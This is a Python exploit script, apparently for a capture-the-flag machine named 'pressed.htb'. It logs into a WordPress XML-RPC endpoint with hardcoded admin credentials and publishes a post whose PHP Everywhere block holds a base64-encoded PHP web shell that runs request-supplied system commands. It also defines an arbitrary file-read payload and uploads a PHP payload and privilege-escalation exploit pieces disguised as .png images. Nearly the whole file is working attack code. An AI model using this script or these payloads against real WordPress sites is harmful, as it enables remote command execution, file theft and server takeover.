#! /usr/bin/python3

import base64
from http import client
from turtle import pos
from urllib import response
from urllib.parse import unquote, quote
from cherrypy import url
from wordpress_xmlrpc import Client,WordPressPost
from wordpress_xmlrpc.compat import xmlrpc_client
import wordpress_xmlrpc.methods as methods

def downloadPostContent(filepath,post):
    print("saving")
    f = open(filepath,"w")
    f.write(post.content)
    f.close()

def buildWpPayload(mypayload,wp_client,post_title):
    print("payload")
    payload = """
    <!-- wp:paragraph -->
<p>Test payload</p>
<!-- /wp:paragraph -->

<!-- wp:php-everywhere-block/php {"code":"""+'"'+mypayload+'"'+""","version":"3.0.0"} /-->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->
    """
    print(payload)
    post = WordPressPost()
    post.title=post_title
    post.content=payload
    post.post_status = "publish"
    wp_client.call(methods.posts.NewPost(post))
    
def uploadFile(wp_client,filenameToUpload, uploadedname):
    print("uploading")
    data = {
        'name': uploadedname,
        'type': 'image/jpeg'
    }

    with open(filenameToUpload,'rb') as myfile:
        data['bits'] = xmlrpc_client.Binary(myfile.read())
    response = wp_client.call(methods.media.UploadFile(data))
    print(response)

wp_client = Client("http://pressed.htb/xmlrpc.php","admin","uhc-jan-finals-2022")

#posts = wp_client.call(methods.posts.GetPosts()) 

#post = wp_client.call(methods.posts.GetPost(posts[0]))

#downloadPostContent("uhc_post",post)


payload = """<?php
    if(isset($_REQUEST['cmd']))
    { 
        echo "<pre>"; 
        $cmd = ($_REQUEST['cmd']); 
        system($cmd); 
        echo "</pre>"; 
        die; 
    }
?>"""

payload_readFile = """<?php
    if(isset($_REQUEST['filename']))
    { 
       $filepath=$_REQUEST['filename'];
       echo(file_get_contents($filepath));     
    }
?>"""
string_encoded = quote(payload)
#string_encoded = quote(payload_readFile)
b64payload = base64.b64encode(string_encoded.encode())
b64payloadString = str(b64payload,"utf-8")

buildWpPayload(b64payloadString,wp_client,"shell")
uploadFile(wp_client,"payload.php","payload.png")
uploadFile(wp_client,"privesc_exploit/part1","part1.png")
uploadFile(wp_client,"privesc_exploit/part2","part2.png")
uploadFile(wp_client,"privesc_exploit/part3","part3.png")
uploadFile(wp_client,"privesc_exploit/part4","part4.png")
uploadFile(wp_client,"privesc_exploit/part5","part5.png")
uploadFile(wp_client,"privesc_exploit/part6","part6.png")
uploadFile(wp_client,"privesc_exploit/part6.2","part6.2.png")
uploadFile(wp_client,"privesc_exploit/part7","part7.png")
uploadFile(wp_client,"privesc_exploit/part8","part8.png")